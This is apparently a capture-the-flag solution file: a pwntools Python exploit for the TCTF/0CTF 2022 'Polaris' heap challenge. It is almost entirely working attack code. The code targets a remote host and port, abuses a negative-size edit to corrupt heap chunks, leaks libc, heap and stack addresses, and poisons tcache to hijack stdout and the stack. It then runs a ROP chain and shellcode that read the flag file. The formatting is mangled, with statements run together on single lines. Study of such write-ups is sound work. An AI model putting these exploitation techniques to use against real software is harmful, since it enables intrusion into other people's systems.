# SOURCE: /home/xujuan/Des-CTF-Knowledge/Des-CTF-Knowledge-main/CTF大赛WP集合/articles/TCTF-0CTF_2022-Polaris_Writeup.md
# TITLE: TCTF/0CTF 2022-Polaris  Writeup
# CATEGORY: pwn

# -*- coding:
utf-8 -*-
from pwn import *import os, struct, random, time, sys, signal
libc = ELF('libc-2.35.so')
class Shell(): def __init__(self): self.clear(arch='amd64', os='linux', log_level='debug') # self.pipe = process(['./babyheap']) self.pipe = remote('47.100.33.132', 2204) def send(self, data:
bytes, **params): return self.pipe.send(data, **params) def sendline(self, data:
bytes, **params): return self.pipe.sendline(data, **params) def recv(self, **params): return self.pipe.recv(**params) def close(self, **params): return self.pipe.close(**params) def recvrepeat(self, timeout, **params): return self.pipe.recvrepeat(timeout, **params) def interactive(self, **params): return self.pipe.interactive(**params) def clear(self, **params): return context.clear(**params)
 def recvn(self, numb, **params): result = self.pipe.recvn(numb, **params) if(len(result) != numb): raise EOFError('recvn') return result
 def recvuntil(self, delims, **params): result = self.pipe.recvuntil(delims, drop=False, **params) if(not result.endswith(delims)): raise EOFError('recvuntil') return result[:-len(delims)]
 def sendafter(self, delim, data, **params): self.recvuntil(delim, **params) self.send(data, **params)
 def sendlineafter(self, delim, data, **params): self.recvuntil(delim, **params) self.sendline(data, **params)
 def add(self, size, content): self.sendlineafter(b'Command: ', b'1') self.sendlineafter(b'Size: ', str(size).encode()) self.sendlineafter(b'Content: ', content) def edit(self, index, content): self.sendlineafter(b'Command: ', b'2') self.sendlineafter(b'Index: ', str(index).encode()) self.sendlineafter(b'Size: ', b'-1') self.sendlineafter(b'Content: ', content)
 def delete(self, index): self.sendlineafter(b'Command: ', b'3') self.sendlineafter(b'Index: ', str(index).encode())
 def show(self, index): self.sendlineafter(b'Command: ', b'4') self.sendlineafter(b'Index: ', str(index).encode())
sh = Shell()sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.add(0x208, b'')sh.add(0x8, b'')sh.edit(0, b'a' * 0x18 + p64(0x441))sh.delete(1)sh.add(0x208, b'')sh.show(2)sh.recvuntil(b'Chunk[2]: ')libc_addr = (u64(sh.recvn(8)) - libc.sym['_IO_2_1_stdin_']) & (~0xfff)success('libc_addr: ' + hex(libc_addr))sh.add(0x8, b'')sh.add(0x8, b'')sh.delete(5)sh.show(2)sh.recvuntil(b'Chunk[2]: ')heap_addr = u64(sh.recvn(8)) * 0x1000success('heap_addr: ' + hex(heap_addr))sh.delete(6)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (libc_addr + libc.sym['_IO_2_1_stdout_'])))sh.add(0x8, b'')sh.add(0x0, b'')sh.edit(6, flat([0xfbad2887 | 0x1000, 0, 0, 0, libc_addr + libc.sym['environ'], libc_addr + libc.sym['environ'] + 8, libc_addr + libc.sym['environ'] + 8]))stack_addr = u64(sh.recvn(8)) - 0x120success('stack_addr: ' + hex(stack_addr))sh.delete(0)sh.delete(5)sh.edit(2, b'b' * 0x18 + p64(0x21) + p64((heap_addr >> 12) ^ (stack_addr - 8)))sh.add(0x0, b'')sh.add(0x0, b'')sh.edit(5, flat([ 0, libc_addr + next(libc.search(asm('pop rdi; ret;'))), stack_addr & (~0xfff), libc_addr + next(libc.search(asm('pop rsi; ret;'))), 0x1000, libc_addr + next(libc.search(asm('pop rdx; pop rbx; ret;'))), 7, 0, libc_addr + next(libc.search(asm('pop rax; ret;'))), 5, libc_addr + next(libc.search(asm('add eax, eax; ret; '))), libc_addr + next(libc.search(asm('syscall; ret;'))), stack_addr + 0x60,
]) + asm(''' mov eax, 0x67616c66 ;// flag push rax
 mov rdi, rsp xor eax, eax mov esi, eax mov al, 2 syscall ;// open
 push rax mov rsi, rsp xor eax, eax mov edx, eax inc eax mov edi, eax mov dl, 8 syscall ;// write open() return value
 pop rax test rax, rax js over
 mov edi, eax mov rsi, rsp mov edx, 0x01010201 sub edx, 0x01010101 xor eax, eax syscall ;// read
 mov edx, eax mov rsi, rsp xor eax, eax inc eax mov edi, eax syscall ;// write
over: xor edi, edi mov eax, 0x010101e8 sub eax, 0x01010101 syscall ;// exit'''))sh.sendlineafter(b'Command: ', b'5')sh.interactive()
